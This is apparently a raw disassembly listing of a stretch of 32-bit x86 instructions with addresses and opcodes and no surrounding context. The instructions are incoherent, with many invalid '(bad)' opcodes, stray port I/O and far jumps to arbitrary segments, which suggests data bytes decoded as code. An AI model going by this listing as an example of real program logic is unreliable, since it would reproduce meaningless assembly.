  425586:	add    eax,DWORD PTR [eax]
  425588:	add    BYTE PTR [eax],al
  42558a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42558b:	ret    0xb366
  42558e:	nop
  42558f:	repz pop eax
  425591:	mov    dl,0x1c
  425593:	pop    esi
  425594:	xor    al,0xa7
  425596:	int    0x65
  425598:	addr16 int3 
  42559a:	jns    0x42559e
  42559c:	les    edi,FWORD PTR [ebx]
  42559e:	pop    ss
  42559f:	inc    ebx
  4255a0:	stc    
  4255a1:	xlat   BYTE PTR ds:[ebx]
  4255a2:	ins    BYTE PTR es:[edi],dx
  4255a3:	add    eax,0x3cd792b3
  4255a8:	sub    eax,0x4994972d
  4255ad:	stos   BYTE PTR es:[edi],al
  4255ae:	jo     0x4255de
  4255b0:	mov    bl,0xb7
  4255b2:	cmp    eax,0x70acd837
  4255b7:	in     eax,0x78
  4255b9:	xchg   ecx,eax
  4255ba:	mov    esi,0xf493fcfe
  4255bf:	or     dh,BYTE PTR [esi+0x13]
  4255c2:	mov    ds:0x9c156044,eax
  4255c7:	mov    bh,0x9f
  4255c9:	cmp    BYTE PTR [ebx+0x4],0xe7
  4255cd:	or     eax,0x19d62ea6
  4255d2:	cmp    dl,cl
  4255d4:	aaa    
  4255d5:	aaa    
  4255d6:	(bad)  
  4255d7:	pop    ebx
  4255d8:	xchg   ebx,edx
  4255da:	test   eax,0x1ac6ef94
  4255df:	retf   0x7241
  4255e2:	lds    edx,FWORD PTR [ebx+0x76]
  4255e5:	es gs jg 0x42565d
  4255e9:	add    DWORD PTR [esi-0x37],eax
  4255ec:	cdq    
  4255ed:	and    al,0x67
  4255ef:	dec    esp
  4255f0:	xor    edi,DWORD PTR [ecx]
  4255f2:	in     al,0x11
  4255f4:	into   
  4255f5:	ds mov ecx,0xfd7f955f
  4255fb:	(bad)  
  4255fc:	sbb    esp,ebp
  4255fe:	test   eax,0x19c3e07d
  425603:	loop   0x42559c
  425605:	cmp    ch,BYTE PTR [eax+0x7]
  425608:	xchg   ebx,eax
  425609:	sbb    esp,esp
  42560b:	sbb    DWORD PTR [esi-0x3312440e],eax
  425611:	add    DWORD PTR [ecx],0xffffffeb
  425614:	es cmp esp,ecx
  425617:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425618:	xchg   DWORD PTR [edx],ebp
  42561a:	ror    DWORD PTR [eax-0x7fa06dc4],0xa2
  425621:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425622:	(bad)  
  425623:	bound  ebx,QWORD PTR [eax+ecx*4-0xa]
  425627:	mov    eax,0xa30d1983
  42562c:	in     eax,0x5a
  42562e:	xchg   ebx,eax
  42562f:	fnsave ds:0xf33e734f
  425635:	in     eax,dx
  425636:	jmp    0x4706:0x41ca7a20
  42563d:	stos   BYTE PTR es:[edi],al
  42563e:	pop    edx
  42563f:	lock popa 
  425641:	pusha  
  425642:	stos   BYTE PTR es:[edi],al
  425643:	popa   
  425644:	mov    ds:0xe08319d2,eax
  425649:	pop    eax
  42564a:	mov    ds:0x72484a19,eax
  42564f:	clc    
  425650:	xor    eax,0x9095697e
  425655:	mov    ds:0xea5b39d,eax
  42565a:	out    dx,al
  42565b:	mov    esp,0xce2288c
  425660:	jno    0x425646
  425662:	add    DWORD PTR [ecx],ecx
  425664:	ret    0xd09a
  425667:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425668:	repnz sub eax,0x153eb949
  42566e:	pop    ebx
  42566f:	xor    al,0x1f
  425671:	push   ebx
  425672:	xchg   esp,eax
  425673:	mov    edx,0xf0c672c3
  425678:	jb     0x4256a5
  42567a:	pop    ecx
  42567b:	cmp    eax,0x25d28d88
  425680:	(bad)  
  425681:	pusha  
  425682:	xchg   esp,eax
  425683:	and    al,0x93
  425685:	mov    WORD PTR ds:0x909ccb21,cs
  42568b:	push   cs
  42568c:	jae    0x4256a1
  42568e:	inc    ebx
  42568f:	ins    BYTE PTR es:[edi],dx
  425690:	push   esi
  425691:	(bad)  
  425693:	repz imul edx,DWORD PTR [edi+0x29e4a707],0x65620f11
  42569e:	sub    BYTE PTR [ecx+esi*4-0xe82c33c],al
  4256a5:	fiadd  DWORD PTR [ecx+0x13]
  4256a8:	jbe    0x425680
  4256aa:	fadd   DWORD PTR [edx*2-0x2968c5a5]
  4256b1:	(bad)  
  4256b3:	sti    
  4256b4:	push   0x1e
  4256b6:	cmp    eax,0x6df54b0e
  4256bb:	aaa    
  4256bc:	cli    
  4256bd:	inc    eax
  4256be:	arpl   WORD PTR [ebx-0x34fa2033],dx
  4256c4:	and    BYTE PTR [ecx],0xed
  4256c7:	mov    bh,0x1e
  4256c9:	mov    bl,0xfe
  4256cb:	mov    esp,0x6f10f431
  4256d0:	repz cmp DWORD PTR [ebx+eax*2+0x68],edx
  4256d5:	js     0x42569c
  4256d7:	(bad)  [edi-0x2cd35be1]
  4256dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4256de:	inc    ebp
  4256df:	into   
  4256e0:	xor    DWORD PTR [ecx],esi
  4256e2:	xor    BYTE PTR [ebx+0x3c],0xb4
  4256e6:	jge    0x425709
  4256e8:	jnp    0x42568f
  4256ea:	and    al,0x66
  4256ec:	sbb    DWORD PTR [esi],ecx
  4256ee:	jno    0x4256aa
  4256f0:	cmp    edx,DWORD PTR [eax+0x1a45b3aa]
  4256f6:	mov    dl,0xcc
  4256f9:	stos   BYTE PTR es:[edi],al
  4256fa:	outs   dx,BYTE PTR ds:[esi]
  4256fb:	cdq    
  4256fc:	xor    eax,0x4da06f61
  425701:	aaa    
  425702:	mov    ch,0x3d
  425704:	out    0xf4,al
  425706:	and    esi,DWORD PTR [ebx+0x5b]
  425709:	xchg   BYTE PTR ds:0x7d8573e9,ah
  42570f:	xchg   esp,eax
  425710:	dec    esp
  425711:	dec    esi
  425712:	add    BYTE PTR [eax],cl
  425714:	sbb    ecx,DWORD PTR [ebx+0x4]
  425717:	push   esp
  425718:	cmp    DWORD PTR [edx+0x38fb623f],esi
  42571e:	mov    ds:0x6eff3f04,al
  425723:	(bad)  
  425724:	icebp  
  425725:	mov    dh,0xd1
  425727:	cmp    edx,DWORD PTR [edi-0x60]
  42572a:	mov    ah,0x5
  42572c:	push   cs
  42572d:	add    al,0x3d
  42572f:	pop    esi
  425730:	out    dx,eax
  425731:	shl    BYTE PTR [ecx+0x4f],cl
  425734:	mov    esi,0xf2e4866b
  425739:	mov    ?,WORD PTR [edx-0x5c]
  42573c:	jno    0x4256e3
  42573e:	lds    esi,FWORD PTR [esi]
  425740:	lods   al,BYTE PTR ds:[esi]
  425741:	mov    ecx,0xb54483b9
  425746:	scas   eax,DWORD PTR es:[edi]
  425747:	push   ds
  425748:	or     ebx,eax
  42574a:	pop    ss
  42574b:	mov    ecx,0x747cbde9
  425750:	(bad)  
  425751:	mov    DWORD PTR [ebp-0x65],ebp
  425754:	mov    dh,0x5f
  425756:	out    0x3c,al
  425758:	std    
  425759:	pop    ds
  42575a:	jecxz  0x42576e
  42575c:	mov    ds,WORD PTR es:[ebp+eiz*8+0x5d9d814c]
  425764:	and    ah,cl
  425766:	in     eax,0x5
  425768:	mov    edi,0xa38d03fd
  42576d:	hlt    
  42576e:	pop    es
  42576f:	push   eax
  425770:	lods   al,BYTE PTR ds:[esi]
  425771:	sti    
  425772:	sbb    eax,0x5b07cd75
  425778:	mov    esi,0x7c97ed03
  42577d:	dec    esp
  42577e:	or     eax,0xfd70f3ee
  425783:	mov    ebp,0xc62a580b
  425788:	xchg   ebx,eax
  425789:	inc    edx
  42578a:	xor    dl,BYTE PTR ds:0xcf2cc48e
  425790:	mov    BYTE PTR [edi],0xa6
  425793:	ds repnz sub al,0xb8
  425797:	dec    ecx
  425798:	fs es addr16 pop esp
  42579c:	cs (bad) 
  42579f:	pop    eax
  4257a0:	dec    ecx
  4257a1:	loop   0x425742
  4257a3:	jecxz  0x4257f4
  4257a5:	and    al,0xe1
  4257a7:	ror    BYTE PTR [esi+ebx*4+0x42],0x8d
  4257ac:	pop    eax
  4257ad:	push   esp
  4257ae:	mov    bh,0xdc
  4257b0:	out    dx,al
  4257b1:	sub    ch,cl
  4257b3:	and    al,ch
  4257b5:	in     eax,0xa3
  4257b7:	inc    ebx
  4257b8:	push   edi
  4257b9:	nop
  4257ba:	mov    ah,0xf
  4257bc:	cmp    ch,dh
  4257be:	rcr    esi,1
  4257c0:	lock in al,dx
  4257c2:	dec    edi
  4257c3:	xchg   ecx,eax
  4257c4:	ss jne 0x425818
  4257c7:	arpl   WORD PTR [edi-0xd],sp
  4257ca:	(bad)  
  4257cb:	jo     0x42582b
  4257cd:	jbe    0x4257f1
  4257cf:	(bad)  
  4257d1:	imul   edx,DWORD PTR [ebp+0x42],0x4864316a
  4257d8:	or     BYTE PTR [esi-0x31],0x38
  4257dc:	xor    DWORD PTR [ebx],eax
  4257de:	xor    bl,BYTE PTR [eax+0x33]
  4257e1:	lock cdq 
  4257e3:	xchg   DWORD PTR [edi-0x43],esi
  4257e6:	loopne 0x4257ba
  4257e8:	aam    0xcc
  4257ea:	sbb    eax,0x99700fba
  4257ef:	add    esi,DWORD PTR [ebx+0x632f4032]
  4257f5:	repnz shl DWORD PTR [eax],1
  4257f8:	test   ecx,esp
  4257fa:	sub    al,0xa7
  4257fc:	cld    
  4257fd:	scas   al,BYTE PTR es:[edi]
  4257fe:	sbb    bh,dh
  425800:	add    ecx,DWORD PTR [edi+0x2a]
  425803:	mov    ebp,0x296d97c3
  425808:	in     eax,0x39
  42580a:	test   eax,0xa7ce43
  42580f:	ror    cl,cl
  425811:	mov    ah,0x2d
  425813:	inc    esp
  425814:	lods   al,BYTE PTR ds:[esi]
  425815:	call   0xaa9d6b79
  42581a:	cmp    BYTE PTR [esi],cl
  42581c:	push   ecx
  42581d:	cdq    
  42581e:	(bad)  
  42581f:	jp     0x4257de
  425821:	adc    dl,0xa7
  425824:	pop    ds
  425825:	test   BYTE PTR [eax-0x29997a57],cl
  42582b:	scas   al,BYTE PTR es:[edi]
  42582c:	rol    BYTE PTR [eax],0x67
  42582f:	sub    ah,al
  425831:	mov    ah,0xf1
  425833:	clc    
  425834:	pop    ss
  425835:	xchg   esi,eax
  425836:	or     eax,edx
  425838:	rol    BYTE PTR [ebx-0x30],1
  42583b:	jmp    0x94b6:0x4b0c43b2
  425842:	leave  
  425843:	scas   al,BYTE PTR es:[edi]
  425844:	ja     0x4258b5
  425846:	repnz push ebx
  425848:	not    DWORD PTR [eax+eax*4+0x6656e9a1]
  42584f:	test   BYTE PTR [esi-0x26],0xe3
  425853:	push   es
  425854:	cmp    DWORD PTR [esi+eax*8-0x1fc65ca5],ecx
  42585b:	scas   al,BYTE PTR es:[edi]
  42585c:	mov    cl,0x77
  42585e:	inc    ebp
  42585f:	std    
  425860:	(bad)  
  425861:	dec    ebp
  425862:	lock inc esi
  425864:	ror    BYTE PTR [esi],cl
  425866:	out    dx,eax
  425867:	mov    ds:0x6b76c661,al
  42586c:	fnstsw WORD PTR [esp+ebx*1]
  42586f:	sbb    ch,BYTE PTR ds:0x9332d72
  425875:	loopne 0x42581f
  425877:	push   0x7c
  425879:	mov    DWORD PTR [edi-0x41],edi
  42587c:	jecxz  0x425849
  42587e:	data16 jo 0x425808
  425881:	fmul   st,st(3)
  425883:	cmp    al,0x36
  425885:	inc    esi
  425886:	retf   0x965f
  425889:	push   eax
  42588a:	add    bh,BYTE PTR [esi]
  42588c:	xor    bl,ah
  42588e:	jns    0x425883
  425890:	mov    edi,0x780c965a
  425895:	push   ebp
  425896:	mov    ds:0x9ad18d56,eax
  42589b:	mov    al,0x27
  42589d:	mov    dl,0x68
  42589f:	fist   WORD PTR [edx-0x58dd0872]
  4258a5:	addr16 es sbb eax,0xf883916c
  4258ac:	ins    BYTE PTR es:[edi],dx
  4258ad:	cmp    bh,ah
  4258af:	outs   dx,BYTE PTR ds:[esi]
  4258b0:	in     eax,0x1
  4258b2:	add    ah,ch
  4258b4:	cdq    
  4258b5:	xor    eax,0x47241c34
  4258ba:	pop    DWORD PTR ds:0xbf758f91
  4258c0:	jp     0x4258c7
  4258c2:	vpaddd xmm5,xmm4,XMMWORD PTR [edi+ebp*2+0x6e]
  4258c8:	xchg   esi,eax
  4258c9:	(bad)  
  4258ca:	mov    es:0x7b5e465c,al
  4258d0:	imul   esi,edx,0xffffffad
  4258d3:	bnd ret 0x5847
  4258d7:	sbb    edx,DWORD PTR ds:[edi+ebp*2-0x3e]
  4258dc:	inc    ebp
  4258dd:	xchg   ecx,eax
  4258de:	jno    0x4258f8
  4258e0:	jge    0x4258e1
  4258e2:	mov    esi,0xee3e7c2d
  4258e7:	sub    DWORD PTR [ebp-0x1e759b6c],esp
  4258ed:	or     ebx,DWORD PTR [edi+0x59d29869]
  4258f3:	and    cl,BYTE PTR [edi]
  4258f5:	jo     0x425968
  4258f7:	xor    bh,ch
  4258f9:	sbb    BYTE PTR [ebp+0x37a39be2],ch
  4258ff:	xchg   esi,eax
  425900:	vpackssdw ymm1,ymm7,YMMWORD PTR [esi+ecx*8]
  425905:	mov    edi,0xa03bf788
  42590a:	loop   0x425969
  42590c:	ds push ds
  42590e:	dec    eax
  42590f:	push   ds
  425910:	ds aad 0xc9
  425913:	cmc    
  425914:	in     eax,0x32
  425916:	aaa    
  425917:	jb     0x425978
  425919:	retf   0x543a
  42591c:	cmp    al,0xd0
  42591e:	push   eax
  42591f:	das    
  425920:	cmp    bh,BYTE PTR [ebx]
  425922:	shrd   DWORD PTR ds:0x1a99abb1,eax,0xf7
  42592a:	and    edx,DWORD PTR [edi]
  42592c:	test   eax,0x4cd1a8ae
  425931:	push   esp
  425932:	mov    ds:0xf9e4,al
	...
  42593f:	add    BYTE PTR [eax],al
  425941:	in     al,dx
  425942:	test   BYTE PTR [eax-0x5f],ah
  425945:	push   0xedcdede5
  42594a:	cld    
  42594b:	mov    BYTE PTR [ebx-0x5b1f2aec],ah
  425951:	push   ecx
  425952:	rol    BYTE PTR [ecx],1
  425954:	add    BYTE PTR [ebx+eax*1+0x47a90000],ch
  42595b:	scas   eax,DWORD PTR es:[edi]
  42595c:	adc    BYTE PTR [edx+0x8d61fe2],dh
  425962:	jb     0x425958
  425964:	stos   BYTE PTR es:[edi],al
  425965:	jl     0x42598e
  425967:	and    eax,0x43ee5b48
  42596c:	fnstsw WORD PTR [ebx+0x1f]
  42596f:	(bad)  
  425970:	fdiv   QWORD PTR [edx]
  425972:	nop
  425973:	xchg   ecx,eax
  425974:	stc    
  425975:	fs (bad) 
  425977:	in     eax,0x5
  425979:	xor    dh,cl
  42597b:	jb     0x4259f9
  42597d:	fsubr  st,st(0)
  42597f:	mov    ebx,0xfbcea7e0
  425984:	mov    bh,bh
  425986:	xor    DWORD PTR [ebp-0x18569b00],esp
  42598c:	out    dx,eax
  42598d:	aaa    
  42598e:	pop    edx
  42598f:	jmp    0xab9dfeac
  425994:	or     al,0x6
  425996:	xchg   ecx,eax
  425997:	pop    esp
  425998:	test   al,0x1d
  42599a:	mov    bh,0x1b
  42599c:	in     al,dx
  42599d:	xor    eax,0x795a34d5
  4259a2:	div    cl
  4259a4:	(bad)  
  4259a6:	test   eax,0xc72972be
  4259ab:	cdq    
  4259ac:	jae    0x4259fe
  4259ae:	inc    ebp
  4259af:	xor    DWORD PTR [esi-0x46],0xffffffdd
  4259b3:	scas   eax,DWORD PTR es:[edi]
  4259b4:	dec    edx
  4259b5:	mov    DWORD PTR [ecx],ebx
  4259b7:	imul   edi,DWORD PTR [esi-0x1d],0xffffffba
  4259bb:	bnd jmp 0x28a32b74
  4259c1:	or     DWORD PTR [eax+0x3c93a697],eax
  4259c7:	lahf   
  4259c8:	ret    0x6ce8
  4259cb:	xchg   ecx,eax
  4259cc:	sti    
  4259cd:	dec    esp
  4259ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4259cf:	mov    eax,ds:0x1079a4ab
  4259d4:	xchg   edi,eax
  4259d5:	sub    BYTE PTR [ecx+ecx*1-0x29],bl
  4259d9:	fninit 
  4259db:	sub    al,0x38
  4259dd:	fild   WORD PTR [ecx+0x7bd9871f]
  4259e3:	sbb    cl,ch
  4259e5:	add    eax,0x72321f4d
  4259ea:	dec    BYTE PTR [ecx-0x5d1c5cf7]
  4259f0:	pop    ecx
  4259f1:	sbb    ah,BYTE PTR [ecx]
  4259f3:	add    DWORD PTR [edx+0xa],ebp
  4259f6:	fcomp  QWORD PTR [esi]
  4259f8:	jge    0x425a42
  4259fa:	mov    ds:0x7033f03d,al
  4259ff:	xchg   ebp,eax
  425a00:	outs   dx,BYTE PTR ds:[esi]
  425a01:	and    bh,BYTE PTR [edx+0x3e]
  425a04:	sar    DWORD PTR [ebx],0xd5
  425a07:	sub    al,0x6d
  425a09:	lahf   
  425a0a:	fdiv   DWORD PTR [esi-0x6d]
  425a0d:	lock jbe 0x425a42
  425a10:	ja     0x425a44
  425a12:	pop    esi
  425a13:	jp     0x425a69
  425a15:	mov    bh,0x45
  425a17:	pop    ebx
  425a18:	int3   
  425a19:	mov    edx,0x94f2b49f
  425a1e:	push   edi
  425a1f:	sbb    cl,bh
  425a21:	in     eax,dx
  425a22:	pop    ebx
  425a23:	lahf   
  425a24:	int3   
  425a25:	sbb    dh,BYTE PTR [edx-0x306b8942]
  425a2b:	sub    ebx,DWORD PTR [ebp+0x2c]
  425a2e:	pop    eax
  425a2f:	sub    edi,eax
  425a31:	shl    BYTE PTR [esi-0x64],0xfd
  425a35:	mov    di,0xe7f8
  425a39:	and    eax,0xc5b32dbf
  425a3e:	xlat   BYTE PTR ds:[ebx]
  425a3f:	outs   dx,BYTE PTR ds:[esi]
  425a40:	and    DWORD PTR [ecx+ebp*4],ecx
  425a43:	out    0xf3,eax
  425a45:	out    0x1c,eax
  425a47:	xchg   ebp,eax
  425a48:	stc    
  425a49:	bound  edx,QWORD PTR [edi]
  425a4b:	add    eax,0x37bf5469
  425a50:	sbb    esp,DWORD PTR [ebx+0x4d]
  425a53:	fucom  st(6)
  425a55:	jecxz  0x425a2a
  425a57:	xor    ebp,DWORD PTR [ebx]
  425a59:	in     eax,dx
  425a5a:	mov    ?,ecx
  425a5c:	ja     0x425a44
  425a5e:	pop    ss
  425a5f:	xor    cl,0xbf
  425a62:	fisttp DWORD PTR [ecx-0x374842b4]
  425a68:	or     bl,BYTE PTR [ecx-0x57fbb954]
  425a6e:	mov    bl,0xa0
  425a70:	es xchg ebp,eax
  425a72:	push   ebx
  425a73:	test   BYTE PTR ds:0x2a5966f4,bl
  425a79:	cld    
  425a7a:	jno    0x425a44
  425a7c:	inc    edi
  425a7d:	sti    
  425a7e:	and    BYTE PTR [edi+0x52c154a6],dl
  425a84:	jge    0x425aae
  425a86:	mov    ah,0x17
  425a88:	xor    dh,BYTE PTR [edx+0x44875e08]
  425a8e:	mov    ah,0x4
  425a90:	rol    DWORD PTR [ebx-0x5350b720],0xd3
  425a97:	loope  0x425adb
  425a99:	push   0xf8df6e82
  425a9e:	(bad)
  425aa1:	dec    edx
  425aa2:	mov    cl,0x57
  425aa5:	inc    ebx
  425aa7:	sti    
  425aa8:	lock jmp 0x425ac8
  425aab:	adc    al,0x5e
  425aad:	neg    BYTE PTR [ebp+0x41]
  425ab0:	adc    DWORD PTR [edx+ebx*8+0x66],0x27f8e733
  425ab8:	out    dx,eax
  425ab9:	scas   eax,DWORD PTR es:[edi]
  425aba:	push   ebx
  425abb:	inc    esi
  425abc:	lods   eax,DWORD PTR ds:[esi]
  425abd:	(bad)  
  425abe:	dec    ebx
  425abf:	mov    ch,0x48
  425ac1:	rol    BYTE PTR [ebx-0x6483a46d],0x3a
  425ac8:	retf   0x43da
  425acb:	dec    ecx
  425acc:	jge    0x425ae2
  425ace:	jp     0x425b00
  425ad0:	fwait
  425ad1:	aad    0xbb
  425ad3:	jle    0x425b51
  425ad5:	int3   
  425ad6:	jnp    0x425b55
  425ad8:	dec    ebx
  425ad9:	and    BYTE PTR [edx],dh
  425adb:	xchg   ebx,eax
  425adc:	push   0xffffffee
  425ade:	rcl    BYTE PTR [ebp-0x63],cl
  425ae1:	push   esi
  425ae2:	mov    edi,0x78df3110
  425ae7:	add    eax,0x86481a44
  425aec:	jmp    0x425b42
  425aee:	fld    TBYTE PTR [eax]
  425af0:	bound  esp,QWORD PTR [edi-0x56]
  425af3:	add    dh,al
  425af5:	mov    dl,0xc5
  425af7:	lds    esi,FWORD PTR [edi]
  425af9:	sub    BYTE PTR ds:[ecx+eiz*4],0xc6
  425afe:	xchg   edi,eax
  425aff:	cmp    edi,DWORD PTR [ebx]
  425b01:	scas   eax,DWORD PTR es:[edi]
  425b02:	and    eax,0x14995f00
  425b07:	lods   eax,DWORD PTR ds:[esi]
  425b08:	call   0x1c59:0xc221c0d1
  425b0f:	test   eax,0x29d24ab8
  425b14:	out    dx,eax
  425b15:	pop    esp
  425b16:	cmp    DWORD PTR [ebx],eax
  425b18:	mov    WORD PTR [ebx],ds
  425b1a:	xchg   ebx,eax
  425b1b:	aaa    
  425b1c:	mov    ds:0x9ce59951,al
  425b21:	imul   eax,DWORD PTR ds:0xb1b86694,0xffffff97
  425b28:	scas   al,BYTE PTR es:[edi]
  425b29:	inc    esi
  425b2a:	addr16 aam 0x85
  425b2d:	ret    0x7bf4
  425b30:	push   eax
  425b31:	pop    ebp
  425b32:	cmp    BYTE PTR [ecx-0x3f2ce709],0x40
  425b39:	jle    0x425ba6
  425b3b:	add    ebx,DWORD PTR ds:0x15f95ddf
  425b41:	jae    0x425b3e
  425b43:	jle    0x425acc
  425b45:	adc    BYTE PTR [esi],ch
  425b47:	stos   DWORD PTR es:[edi],eax
  425b48:	addr16 daa 
  425b4a:	lds    ecx,FWORD PTR [esi-0x675d5b5c]
  425b50:	inc    edi
  425b51:	cmp    al,BYTE PTR [esi]
  425b53:	or     eax,0xc527137
  425b58:	push   ebx
  425b59:	jo     0x425b47
  425b5b:	or     al,0xf1
  425b5d:	stos   DWORD PTR es:[edi],eax
  425b5e:	xchg   ebp,eax
  425b5f:	inc    ebp
  425b60:	cmp    al,0x3d
  425b62:	adc    al,0x7
  425b64:	scas   eax,DWORD PTR es:[edi]
  425b65:	out    dx,eax
  425b66:	std    
  425b67:	sar    BYTE PTR [ebp-0x7c],cl
  425b6a:	pushf  
  425b6b:	inc    ebp
  425b6c:	xchg   ecx,eax
  425b6d:	inc    edx
  425b6e:	dec    edi
  425b6f:	cld    
  425b70:	add    esp,DWORD PTR [ebx-0x72]
  425b73:	test   DWORD PTR [ebx+ecx*1-0x396d9fe7],edx
  425b7a:	outs   dx,BYTE PTR ds:[esi]
  425b7b:	rcl    edi,cl
  425b7d:	hlt    
  425b7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425b7f:	jne    0x425b7a
  425b81:	mov    bh,0xc4
  425b83:	push   DWORD PTR [esi-0x31]
  425b86:	xor    DWORD PTR [eax+0x25],ecx
  425b89:	lods   al,BYTE PTR ds:[esi]
  425b8a:	push   0xccaf96a6
  425b8f:	test   BYTE PTR [edi],al
  425b91:	push   ebp
  425b92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425b93:	(bad)  
  425b94:	inc    ebp
  425b95:	mov    esp,0xa0d23b61
  425b9a:	or     ecx,ecx
  425b9c:	pusha  
  425b9d:	cmc    
  425b9e:	(bad)  [eax-0x38]
  425ba1:	gs inc esp
  425ba3:	mov    cl,0xde
  425ba5:	xchg   ecx,eax
  425ba6:	mov    ecx,0x7a241e59
  425bab:	xor    DWORD PTR [edx-0x29],edx
  425bae:	lds    esp,FWORD PTR [bp-0x40]
  425bb2:	scas   eax,DWORD PTR es:[edi]
  425bb3:	or     eax,0x7a5ca222
  425bb8:	mov    ds,WORD PTR [ebp-0x3aef2165]
  425bbe:	je     0x425b56
  425bc0:	retf   
  425bc1:	sub    edx,DWORD PTR [ecx+0x5]
  425bc4:	bound  esp,QWORD PTR [edx-0xf690002]
  425bca:	sahf   
  425bcb:	inc    ebp
  425bcc:	das    
  425bcd:	mov    bl,0xad
  425bcf:	pop    eax
  425bd0:	test   bl,0x3b
  425bd3:	inc    esi
  425bd4:	cmp    eax,0x2c1f938b
  425bd9:	iret   
  425bda:	jle    0x425b64
  425bdc:	add    BYTE PTR [esi+0x66bfcb0d],al
  425be2:	(bad)  
  425be3:	call   0xae66:0xd8fc9f50
  425bea:	ds int 0x6b
  425bed:	dec    ebx
  425bee:	(bad)  
  425bef:	push   esp
  425bf0:	stc    
  425bf1:	cmp    BYTE PTR [esi],cl
  425bf3:	mov    edi,0x90e8dbf2
  425bf8:	push   cs
  425bf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425bfa:	js     0x425b9a
  425bfc:	retf   0x84ea
  425bff:	push   ss
  425c00:	jbe    0x425baa
  425c02:	daa    
  425c03:	popa   
  425c04:	push   edi
  425c05:	or     BYTE PTR [ebp-0x57b22736],bh
  425c0b:	outs   dx,BYTE PTR ds:[esi]
  425c0c:	sub    DWORD PTR [ebp+eax*8+0x68],eax
  425c10:	idiv   BYTE PTR [ecx+0x21]
  425c13:	mov    DWORD PTR [ecx],edi
  425c15:	jg     0x425c66
  425c17:	xchg   edi,eax
  425c18:	and    DWORD PTR [ebp+eiz*1+0x12129e91],eax
  425c1f:	pusha  
  425c20:	xchg   esp,eax
  425c21:	test   DWORD PTR [eax+0x0],esp
  425c24:	dec    edi
  425c25:	call   0xbbeda3e7
  425c2a:	xchg   esi,eax
  425c2b:	test   BYTE PTR [edx-0x7a8df208],bl
  425c31:	(bad)  
  425c32:	xchg   ebp,eax
  425c33:	or     cl,BYTE PTR [ebx-0x6f1ca240]
  425c39:	add    eax,0xd175197f
  425c3e:	hlt    
  425c3f:	ss aam 0x10
  425c42:	dec    eax
  425c43:	inc    esp
  425c44:	inc    ebp
  425c45:	sbb    eax,0x1907bbcd
  425c4a:	mov    eax,0x361ccbfb
  425c4f:	pop    es
  425c50:	clc    
  425c51:	sub    al,bh
  425c53:	pop    ecx
  425c54:	jp     0x425bf7
  425c56:	xchg   DWORD PTR [ecx+0x17],edi
  425c59:	fwait
  425c5a:	xchg   ecx,eax
  425c5b:	test   al,0x10
  425c5d:	push   0xfffffff2
  425c5f:	(bad)  
  425c60:	sbb    dl,ah
  425c62:	loope  0x425c3d
  425c64:	sub    al,0x89
  425c66:	aaa    
  425c67:	ins    DWORD PTR es:[edi],dx
  425c68:	call   0x730b:0x9a30bea8
  425c6f:	js     0x425cbe
  425c71:	and    ebx,edi
  425c73:	call   0xaf48:0x57903b1f
  425c7a:	mov    ebp,0x4e8d6e74
  425c7f:	jl     0x425c81
  425c81:	push   edi
  425c82:	xor    eax,0x3d8342a4
  425c87:	enter  0x126b,0xcb
  425c8b:	les    ecx,FWORD PTR [edi-0x37]
  425c8e:	iret   
  425c8f:	mov    ds:0xe6cd513c,al
  425c94:	inc    esi
  425c95:	scas   al,BYTE PTR es:[edi]
  425c96:	outs   dx,DWORD PTR ds:[esi]
  425c97:	and    al,0x11
  425c99:	mov    ebx,0x71e82861
  425c9e:	idiv   bh
  425ca0:	div    dl
  425ca2:	aam    0x86
  425ca4:	(bad)  [esi-0x4ce68052]
  425caa:	mov    ecx,0xe7d279c2
  425caf:	je     0x425cf8
  425cb1:	nop
  425cb2:	hlt    
  425cb3:	mov    ax,ds:0xc73c219d
  425cb9:	cs addr16 sahf 
  425cbc:	pop    eax
  425cbd:	icebp  
  425cbe:	adc    eax,0xee48dc39
  425cc3:	fmul   QWORD PTR [edx+0x1ca6e4e1]
  425cc9:	sbb    eax,0xd6a90a84
  425cce:	gs mov bh,0x76
  425cd1:	push   edx
  425cd2:	mov    dl,0x2d
  425cd4:	hlt    
  425cd5:	mov    al,0xb6
  425cd7:	mov    cl,0x63
  425cd9:	jnp    0x425d57
  425cdb:	aad    0x79
  425cdd:	pop    ebx
  425cde:	rol    edx,cl
  425ce0:	(bad)  
  425ce1:	lds    edi,FWORD PTR [ebx+0x1]
  425ce4:	rol    esp,cl
  425ce6:	sbb    eax,0xcd189a27
  425ceb:	shl    DWORD PTR [eax+0x5fd2f23f],1
  425cf1:	mov    ebp,0xfce95997
  425cf6:	int3   
  425cf7:	int    0x64
  425cf9:	xchg   ecx,eax
  425cfa:	clc    
  425cfb:	mov    bl,0xba
  425cfd:	arpl   WORD PTR [ebx-0x7],bx
  425d00:	cmp    eax,0xa6b59ee4
	...
  425d11:	pop    edx
  425d12:	push   ecx
  425d13:	leave  
  425d14:	popf   
  425d15:	retf   
  425d16:	popf   
  425d17:	pop    esi
  425d18:	xlat   BYTE PTR ds:[ebx]
  425d19:	loope  0x425d6f
  425d1b:	fs lock push es
  425d1e:	push   esp
  425d1f:	add    eax,0x1d3fdd5
  425d24:	add    BYTE PTR [ebx+eax*1+0x39f0000],ch
  425d2b:	and    BYTE PTR [ebp-0x23],ah
  425d2e:	xor    BYTE PTR [ecx],dh
  425d30:	ja     0x425d82
  425d32:	xchg   ecx,eax
  425d33:	jp     0x425d9b
  425d35:	pop    DWORD PTR [eax+esi*1]
  425d38:	(bad)  
  425d3a:	call   0x2003:0x986b5c40
  425d41:	mov    ch,0xb0
  425d43:	data16 sbb ch,BYTE PTR ss:[ecx+0x2a668800]
  425d4b:	mov    es,ecx
  425d4d:	pop    edi
  425d4e:	xchg   esi,eax
  425d4f:	or     ebp,DWORD PTR [eax]
  425d51:	or     BYTE PTR [eax],dl
  425d53:	pop    esi
  425d54:	add    BYTE PTR ds:0x861d8073,dl
  425d5a:	lods   al,BYTE PTR ds:[esi]
  425d5b:	ss mov esp,0xb651564
  425d61:	jae    0x425dd9
  425d63:	fnstcw WORD PTR [ecx]
  425d65:	inc    eax
